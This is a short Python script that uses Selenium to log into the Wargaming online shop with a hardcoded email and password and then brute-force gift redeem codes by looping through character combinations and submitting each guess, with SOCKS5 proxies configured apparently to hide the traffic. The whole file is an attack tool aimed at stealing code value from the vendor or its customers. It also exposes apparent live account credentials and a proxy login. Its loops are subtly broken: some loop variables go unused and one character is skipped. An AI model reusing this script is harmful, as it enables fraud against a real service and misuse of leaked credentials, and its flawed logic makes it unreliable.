from selenium import webdriver
import time
url = 'https://ru.wargaming.net/shop/redeem/'
from telebot import apihelper
#apihelper.proxy = {'https': 'socks5://mazafaka:mazafaka123@178.128.24.1:1080'}
apihelper.proxy = {'https': 'socks5://72.210.252.152:1080'}
def main():
    driver = webdriver.Chrome()
    driver.get(url)

    time.sleep(6)
    login = driver.find_element_by_class_name('js-login-input')
    login.send_keys('xaint225@gmail.com')

    password = driver.find_element_by_class_name('js-password-input')
    password.send_keys('22061973zxcvbnm1R')


    btn_log = driver.find_element_by_class_name('button-airy')
    btn_log.click()
    time.sleep(5)
    kod = driver.find_element_by_class_name('qa_redeem_code_input')
    alphabet = {
         1:'A',
         2: 'B',
         3: 'C',
         4: 'D',
         5: 'E',
         6: 'F',
         7: 'G',
         8: 'H',
         9: 'I',
         10: 'J',
         11: 'K',
         12: 'L',
         13: 'M',
         14: 'N',
         15: 'O',
         16: 'P',
         17: 'Q',
         18: 'R',
         19: 'S',
         20: 'T',
         21: 'U',
         22: 'V',
         23: 'W',
         24: 'X',
         25: 'Y',
         26: 'Z',
         27: '0',
         28: '1',
         29: '2',
         30: '3',
         31: '4',
         32: '5',
         33: '6',
         34: '7',
         35: '8',
         36: '9',

        }
    for a in range(1,36,1):
        for b in range(1,36,1):
            for c in range(1,36,1):
                for d in range(1,36,1):
                    for e in range(1,36,1):
                        for f in range(1,36,1):
                            for g in range(1,36,1):
                                for h in range(1,36,1):
                                    for i in range(1,36,1):
                                        for j in range(1,36,1):
                                            for k in range(1,36,1):
                                                for l in range(1,36,1):
                                                    for m in range(1,36,1):
                                                        for n in range(1,36,1):
                                                            for o in range(1,36,1):

                                                                kod.send_keys(f'WF8{alphabet[d]}{alphabet[e]}-{alphabet[f]}{alphabet[g]}{alphabet[h]}{alphabet[i]}{alphabet[j]}-{alphabet[k]}{alphabet[l]}{alphabet[m]}{alphabet[n]}{alphabet[o]}')

                                                                btn_log = driver.find_element_by_class_name('qa_redeem_code_button')
                                                                btn_log.click()
                                                                time.sleep(0.3)
                                                                kod.clear()




main()